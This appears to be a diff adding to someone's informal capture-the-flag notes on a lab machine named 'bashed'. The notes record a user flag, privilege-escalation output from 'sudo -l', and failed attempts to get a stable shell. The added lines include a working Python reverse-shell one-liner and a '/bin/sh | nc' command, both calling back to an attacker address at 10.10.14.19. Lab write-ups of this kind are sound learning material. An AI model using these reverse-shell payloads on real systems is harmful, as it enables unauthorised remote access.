@@ -69,3 +69,35 @@ now we need to find vuln in the code
 ![](20230211140234.png)  
 
 problem with uploading shell
+
+but user flag gotten easily
+
+![](20230214120019.png)  
+
+python shell
+
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+`nc -lvp 1235`
+
+
+/var/www/html/dev# sudo -l
+
+Matching Defaults entries for www-data on bashed:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bashed:
+(scriptmanager : scriptmanager) NOPASSWD: ALL
+
+python doesn'tseem to run
+
+in my case however nc  return connect momentarily
+
+/bin/sh | nc 10.10.14.19 1235
+
+trying all weird combinations but unableto get the script accross
+
+so bashed shall remain unconquered
+
